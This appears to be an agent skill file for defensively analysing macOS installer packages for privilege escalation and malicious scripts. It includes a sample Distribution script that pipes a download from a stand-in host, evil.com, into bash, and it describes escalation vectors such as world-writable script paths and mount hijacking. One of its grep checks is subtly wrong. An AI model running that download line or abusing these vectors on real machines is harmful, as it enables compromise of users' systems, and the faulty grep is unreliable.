---
name: macos-installer-analysis
description: Analyze macOS installer packages (.pkg and .dmg files) for security vulnerabilities, privilege escalation vectors, and malicious content. Use this skill whenever you need to inspect installer packages, extract and analyze installer scripts, identify authorization bypass opportunities, or understand macOS installer architecture for security research. Trigger this skill for any task involving .pkg files, .dmg files, installer package analysis, pre/post-install script examination, or macOS privilege escalation through installer abuse.
---

# macOS Installer Package Analysis

A skill for analyzing macOS installer packages to identify security vulnerabilities, privilege escalation vectors, and potential malicious content.

## When to Use This Skill

Use this skill when you need to:
- Inspect the contents of `.pkg` or `.dmg` installer files
- Extract and analyze pre/post-installation scripts
- Identify privilege escalation opportunities in installer configurations
- Understand macOS installer package structure for security research
- Detect malicious patterns in installer packages
- Analyze installer scripts for command injection or unauthorized execution

## Package Structure Overview

### PKG File Hierarchy

A `.pkg` file contains:

| Component | Format | Purpose |
|-----------|--------|--------|
| **Distribution** | XML | Customizations, script/installation checks, JavaScript execution |
| **PackageInfo** | XML | Install requirements, locations, script paths |
| **Bill of Materials (BOM)** | Binary | File list with permissions, updates, removals |
| **Payload** | CPIO + gzip | Files to install at target location |
| **Scripts** | CPIO + gzip | Pre/post install scripts and resources |

### DMG File Structure

DMG files are mountable disk images containing:
- **Top Level**: Root of disk image
- **Application (.app)**: The actual application bundle
- **Applications Link**: Shortcut to `/Applications` folder for drag-to-install

## Analysis Workflow

### Step 1: Extract Package Contents

Use the `extract_pkg.sh` script to decompress a `.pkg` file:

```bash
./scripts/extract_pkg.sh /path/to/package.pkg /path/to/output/dir
```

This will extract:
- `Distribution` - XML with installer configuration and JavaScript
- `PackageInfo` - XML with install metadata
- `Payload` - Compressed file archive
- `Scripts` - Pre/post install scripts

### Step 2: Analyze Distribution XML

The Distribution file is critical for security analysis:

```bash
cat Distribution | grep -A 20 "<script>"
```

Look for:
- **JavaScript execution** via `<script>` tags
- **`system.run()`** calls that execute arbitrary commands
- **`installationCheck()`** functions that may bypass sandbox detection
- **`preflight()`** and **`postflight()`** functions for command execution

### Step 3: Extract and Review Scripts

Extract scripts from the Scripts archive:

```bash
cat Scripts | gzip -dc | cpio -i
```

Then analyze:
- `preinstall` - Runs before installation
- `postinstall` - Runs after installation
- `preupgrade` / `postupgrade` - Run during upgrades
- `precheck` - Runs before installation checks

### Step 4: Identify Privilege Escalation Vectors

#### Vector 1: Public Directory Execution

Check if scripts execute from world-writable locations:

```bash
grep -r "/var/tmp/" "/tmp/" "/Users/Shared/" Scripts/
```

If scripts run from these locations, an attacker could replace them.

#### Vector 2: AuthorizationExecuteWithPrivileges

This function executes files as root. Check if the installer calls it with modifiable paths:

```bash
grep -r "AuthorizationExecuteWithPrivileges" .
```

If found, verify the target file path is not writable by non-root users.

#### Vector 3: Mount Point Hijacking

Check if installer writes to `/tmp/fixedname/` patterns:

```bash
grep -r "/tmp/" PackageInfo Distribution
```

An attacker could mount over these paths to inject malicious files.

#### Vector 4: Empty Payload with Scripts

Check if the package has no payload but contains scripts:

```bash
ls -la Payload
# If empty or very small, but Scripts exist, this is suspicious
```

## Common Vulnerability Patterns

### Pattern 1: JavaScript in Distribution

```xml
<script>
<![CDATA[
function preflight() {
    system.run("/bin/bash -c 'curl http://evil.com/payload | bash'");
}
]]>
</script>
```

**Risk**: Arbitrary command execution during installation

### Pattern 2: Unrestricted Script Paths

```xml
<installer-gui-script>
  <options require-scripts="false"/>
</installer-gui-script>
```

**Risk**: Scripts may execute without proper validation

### Pattern 3: World-Writable Script Locations

```bash
#!/bin/bash
# preinstall script
/var/tmp/Installerutil/some_script.sh
```

**Risk**: Attacker can replace script before execution

### Pattern 4: Root Execution Without Validation

```bash
AuthorizationExecuteWithPrivileges("/path/to/script", NULL, TRUE, NULL)
```

**Risk**: If `/path/to/script` is writable, privilege escalation

## Security Research Use Cases

### Use Case 1: Analyzing Suspicious Installers

When you receive a suspicious `.pkg` file:

1. Extract with `extract_pkg.sh`
2. Review Distribution for JavaScript
3. Check all scripts for suspicious commands
4. Verify file permissions in BOM
5. Look for network connections in scripts

### Use Case 2: Testing Installer Hardening

To verify your installer is secure:

1. Extract and review all scripts
2. Ensure no world-writable paths
3. Verify no JavaScript in Distribution
4. Check AuthorizationExecuteWithPrivileges usage
5. Validate all file permissions

### Use Case 3: CTF/Security Research

For authorized security research:

1. Use `analyze_pkg.sh` for quick vulnerability scan
2. Review extracted scripts for privilege escalation
3. Check for CVE-2021-26089 patterns (mount hijacking)
4. Look for DEF CON 27 "Unpacking Pkgs" techniques

## Scripts Reference

### extract_pkg.sh

Extracts a `.pkg` file to a specified directory:

```bash
./scripts/extract_pkg.sh /path/to/package.pkg /output/dir
```

### analyze_pkg.sh

Performs automated security analysis on extracted package:

```bash
./scripts/analyze_pkg.sh /path/to/extracted/dir
```

Checks for:
- JavaScript in Distribution
- World-writable script paths
- AuthorizationExecuteWithPrivileges usage
- Empty payload with scripts
- Suspicious commands in scripts

## Output Format

When analyzing a package, provide:

```
## Package Analysis Report

### Basic Information
- Package: [name]
- Size: [size]
- Identifier: [bundle ID]

### Distribution Analysis
- JavaScript present: [yes/no]
- Script functions: [list]
- system.run() calls: [count]

### Script Analysis
- Pre-install scripts: [count]
- Post-install scripts: [count]
- Suspicious commands: [list]

### Privilege Escalation Vectors
- Public directory execution: [yes/no]
- AuthorizationExecuteWithPrivileges: [yes/no]
- Mount hijacking risk: [yes/no]

### Recommendations
- [list of security improvements]
```

## Important Notes

- **Authorization Required**: Only analyze packages you own or have explicit permission to test
- **Legal Compliance**: This skill is for authorized security research, penetration testing, and CTF competitions
- **System Safety**: Extract packages to isolated directories; do not execute unknown scripts
- **Documentation**: Reference DEF CON 27 talks and CVE-2021-26089 for deeper understanding

## References

- [DEF CON 27 - Unpacking Pkgs](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [OBTS v4.0 - The Wild World of macOS Installers](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [CVE-2021-26089 - Mount Hijacking](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [Red Team Recipe - macOS Red Teaming](https://redteamrecipe.com/macos-red-teaming)
- [Suspicious Package Tool](https://mothersruin.com/software/SuspiciousPackage/)
